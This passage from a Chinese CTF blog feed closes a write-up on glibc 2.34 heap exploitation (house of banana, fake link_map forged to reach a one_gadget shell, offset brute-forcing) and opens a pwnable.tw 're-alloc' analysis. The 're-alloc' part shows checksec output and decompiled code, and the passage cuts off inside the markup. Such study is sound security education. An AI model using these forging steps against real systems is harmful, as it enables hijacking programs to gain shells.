class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; tel &lt;span class=&#34;number&#34;&gt;0x55a656f072a0&lt;/span&gt;(fake) &lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072a0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;							&lt;span class=&#34;comment&#34;&gt;//l_addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓     &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0028&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072c8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55a656f072a0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;				&lt;span class=&#34;comment&#34;&gt;//l_real&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0030&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072d0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;07&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0038&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072d8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0040&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072e0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;09&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0048&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072e8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55a656f072f8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f56e4244cec&lt;/span&gt; (execvpe+&lt;span class=&#34;number&#34;&gt;652&lt;/span&gt;) ◂— mov    rdx, r12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;a:&lt;span class=&#34;number&#34;&gt;0050&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072f0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0058&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072f8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f56e4244cec&lt;/span&gt; (execvpe+&lt;span class=&#34;number&#34;&gt;652&lt;/span&gt;) ◂— mov    rdx, r12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;c:&lt;span class=&#34;number&#34;&gt;0060&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f07300&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt; /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;d:&lt;span class=&#34;number&#34;&gt;0068&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f07308&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;e:&lt;span class=&#34;number&#34;&gt;0070&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f07310&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0f&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0078&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f07318&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0080&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f07320&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓     &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00b&lt;/span&gt;8│  &lt;span class=&#34;number&#34;&gt;0x55a656f07358&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;c0│  &lt;span class=&#34;number&#34;&gt;0x55a656f07360&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓     &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1f&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00f&lt;/span&gt;8│  &lt;span class=&#34;number&#34;&gt;0x55a656f07398&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0100&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073a0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0108&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073a8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0110&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073b0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55a656f072e0&lt;/span&gt; 	&lt;span class=&#34;comment&#34;&gt;//l_info[26]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;23&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0118&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073b8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0120&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073c0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55a656f072e8&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;//l_info[28]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0128&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073c8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;26&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0130&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073d0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0138&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073d8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后我们就是利用 onegadget 获得 shell 了。&lt;/p&gt;
&lt;p&gt;利用 gdb 万能必挂点，结合 one_gadget 工具帮助我们快速找到合适的 one_gadget&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;./p5.png&#34; alt=&#34;p5&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;一些注意点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些注意点&#34;&gt;#&lt;/a&gt; 一些注意点：&lt;/h5&gt;
&lt;p&gt;​	因为_rtld_global 这个符号是存在与 ld.so 文件中，往往出题人不会给出 ld.so 文件，，rtld_global_ptr 与 libc_base 的偏移在本地与远程并不是固定的，可能会在地址的第 2 字节处发生变化，因此可以爆破 256 种可能得到远程环境的精确偏移&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;​		本文主要就是介绍我们常用的手法，在高版本的利用情况，主要关注的是在较新版本 Glibc-2.34 0ubuntu3.2 的可行性。因为 2.34 主要问题还是在于一些 hook 函数被禁止，以及对_IO_str_finish、_IO_str_overflow 变化的影响，导致我们可以利用的点是在是很少了。但是这其实对于各位 ctfer 来讲，因为方法很少，导致攻击手法比较的单一，只有那么几个可以使用。在 3.2 版本之前，我们依旧可以通过修改 vtable 劫持控制流，或者攻击’exit_hook’(这个叫法可能会不太严谨，因为并不是一个 hook 的符号，而是其他的符号)。house of kiwi, 攻击 exit_hook 依旧是可以实现，且比较方便的。&lt;/p&gt;
&lt;p&gt;​	后面我这里主要介绍了 house of banana, 这项技术，依旧是用于 3.2，并且向下兼容。简要概括，就是修改第三个节点的 l_next 为堆地址 fake，并在该堆上伪造第四个节点。&lt;/p&gt;
&lt;p&gt;伪造 link_map&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;​				 *(fake+0x28)=fake。&lt;/li&gt;
&lt;li&gt;​				*(fake +0x48)=fake+0x58,   *(fake+0x50) = 0x8&lt;/li&gt;
&lt;li&gt;​				*(fake+0x58) = shell&lt;/li&gt;
&lt;li&gt;​				*(fake+0x110) = fake+0x40&lt;/li&gt;
&lt;li&gt;​				*(fake+0x120) = fake+0x48&lt;/li&gt;
&lt;li&gt;​				(int)*(fake+0x31c) = 0x9&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最后笔者在这里提出一个未完成的验证，house of emma 在 3.2 版本下的利用.&lt;/p&gt;
&lt;p&gt;​		因为个人实力依旧比较菜，文章出可能会出现错误及不足，欢迎斧正。也希望能和对此文感兴趣的师傅进一步交流关于新版本的利用姿势。&lt;/p&gt;
&lt;p&gt;​	[参考]：&lt;/p&gt;
&lt;p&gt;​	想到验证各种姿势，感谢&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ydWFuNzc3LmdpdGh1Yi5pby8=&#34;&gt; ru7n&lt;/span&gt; 师傅&lt;/p&gt;
&lt;p&gt;​	3.2 下攻击 exit_hook 的思考，感谢&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjQ4Mzc4Nz90eXBlPWJsb2c=&#34;&gt; Ayaka&lt;/span&gt; 师傅&lt;/p&gt;
&lt;p&gt;​	house of banana 的最初构想	感谢&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL21lbWJlci8xNDY4Nzg=&#34;&gt; ha1vk&lt;/span&gt; 师傅&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/05/13/pwnable-re-alloc/</guid>
            <title>pwnable-re-alloc</title>
            <link>http://example.com/2022/05/13/pwnable-re-alloc/</link>
            <category>writeup</category>
            <pubDate>Fri, 13 May 2022 16:28:21 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;pwnabletw&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwnabletw&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1B3bmFibGUudHc=&#34;&gt;Pwnable.tw&lt;/span&gt; 	re-alloc&lt;/h1&gt;
&lt;p&gt;说明：因为没有合适的 glibc 资源（自已懒），这里只是进行了一个理论分析。&lt;/p&gt;
&lt;h2 id=&#34;环境保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境保护&#34;&gt;#&lt;/a&gt; 环境保护&lt;/h2&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/pwnable/re-alloc$ checksec --file=re-alloc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   83) Symbols	  Yes	1		2		re-alloc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/pwnable/re-alloc$ strings libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so | grep ubuntu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;https://bugs.launchpad.net/ubuntu/+&lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;/glibc/+bugs&amp;gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/pwnable/re-alloc$ &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2.29 的一个 glibc，这里要注意的就是对 tcache 一个保护机制，将 tcache_chunk 的包括指针指向了 tcache。没有 pie 的保护。&lt;/p&gt;
&lt;p&gt;而且 RELRO 没有全开，就意味着我们可以修改 got 表。只要我们有办法泄露出 libc。以及任意地址写。&lt;/p&gt;
&lt;h2 id=&#34;代码分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码分析&#34;&gt;#&lt;/a&gt; 代码分析&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&amp;amp;byte_402070);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;$   1. Alloc               $&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;$   2. Realloc             $&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;$   3. Free                $&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;$   4. Exit                $&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;主要实现了增删，全局没有 malloc 函数，但是 realloc 内在内部调用 malloc。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span 